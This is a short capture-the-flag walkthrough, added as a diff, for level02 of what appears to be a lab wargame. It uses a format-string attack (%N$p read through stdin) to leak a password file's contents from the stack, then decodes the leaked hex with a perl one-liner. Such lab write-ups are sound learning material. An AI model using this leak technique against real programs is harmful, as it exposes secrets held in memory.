@@ -1,0 +1,28 @@
+1. ssh level02@192.168.56.101 -p 4242
+2. ls -la
+3. ./level02
+4. scp -P 4242 level02@192.168.56.101:/home/users/level02/level02 .
+5. open /Application/IDA Freeware 7.7/ida64.app
+6. analyze level02 ELF binary ->
+    gets level03/.pass to rbp register, stdin printf
+7. Go crazy:
+    # Generate 0..<100 pointers for printf (to print rbp register value)
+    echo 'for address in 0..<100 { print("\(address) %\(address)$p") }' | swift repl | pbcopy
+    vim /tmp/addresses # Paste generated addresses from pasteboard
+    
+    # run ./level02 with each address in stdin
+    while read a; do echo $a | ./level02 | grep "0x"; done < /tmp/addresses
+
+8. Analyze offbeat monotonous addresses:
+    0x756e505234376848
+    0x45414a3561733951
+    0x377a7143574e6758
+    0x354a35686e475873
+    0x48336750664b394d
+
+Looks like a rbp register (level03/.pass content)
+
+9. Decode it to ascii
+    perl -e 'print pack "H*", unpack "H*", reverse pack "H*", "48336750664b394d354a35686e475873377a7143574e675845414a3561733951756e505234376848"; print "\n"'
+
+Catch 'em!
